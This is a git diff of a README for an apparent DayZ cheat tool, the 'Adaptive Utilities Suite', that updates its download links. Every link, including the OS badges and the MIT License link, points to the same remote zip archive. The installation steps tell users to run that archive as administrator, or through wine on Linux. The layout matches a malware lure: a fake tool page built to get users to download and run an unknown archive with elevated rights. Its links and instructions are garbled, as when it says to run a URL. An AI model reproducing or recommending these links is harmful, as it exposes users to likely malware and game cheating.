@@ -1,6 +1,6 @@
 # 🎮 DayZ Adaptive Utilities Suite
 
-[![Download](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=download)](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip)
+[![Download](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip)
 
 Welcome to the ultimate companion platform for elevating your DayZ journey! This repository offers an advanced toolkit, delicately engineered to provide new perspectives and superior gameplay control. Breaking away from conventional enhancement packs, our Adaptive Utilities Suite harmonizes world-class features with seamless integration, bridging the virtual wilds with smarts and style.
 
@@ -10,10 +10,10 @@ Welcome to the ultimate companion platform for elevating your DayZ journey! This
 
 | Operating System | Supported | Notes |
 |------------------|:---------:|-------|
-| ![Windows](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip✓-blue) | Yes | Full feature suite |
-| ![Linux](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip✓-orange) | Yes | Wine or native support |
-| ![macOS](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip✓-grey) | Yes | Rosetta required for M1/M2 chips |
-| ![Steam Deck](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip%20Deck-Partial-lightgrey) | Partial | Basic UI runs; optimizations pending |
+| ![Windows](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip✓-blue) | Yes | Full feature suite |
+| ![Linux](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip✓-orange) | Yes | Wine or native support |
+| ![macOS](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip✓-grey) | Yes | Rosetta required for M1/M2 chips |
+| ![Steam Deck](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip%20Deck-Partial-lightgrey) | Partial | Basic UI runs; optimizations pending |
 
 ---
 
@@ -54,13 +54,13 @@ Looking for DayZ augmentation tools, advanced player utilities, stealth game imp
 ## 🚀 Installation Guide
 
 **Step 1:** Click the Download badge:  
-[![Download](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=download)](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip)
+[![Download](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip)
 
 **Step 2:** Extract the contents of the downloaded archive to a directory of your choice.
 
 **Step 3:**  
-- On **Windows**, run `https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip` as administrator.  
-- On **Linux**, launch via terminal: `wine https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip`  
+- On **Windows**, run `https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip` as administrator.  
+- On **Linux**, launch via terminal: `wine https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip`  
 - On **macOS**, right-click > Open With > Terminal after unzipping. Native M1/M2 support requires Rosetta.
 
 **Step 4:** On first launch, follow the in-app tutorial for quick configuration and language selection.
@@ -95,9 +95,9 @@ Configure your own OpenAI and Claude API keys in the settings panel. All interac
 
 ## 📜 MIT License (2025)
 
-Distributed under the [MIT License](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip).  
 Copyright © 2025.
 
 ---
 
-[![Download](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=download)](https://github.com/Comnaemman/dayz-advantage-toolset/raw/refs/heads/branch/anamorphote/advantage_toolset_dayz_v1.0.zip)
+[![Download](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/Comnaemman/dayz-advantage-toolset/branch/anamorphote/toolset_dayz_advantage_1.8.zip)
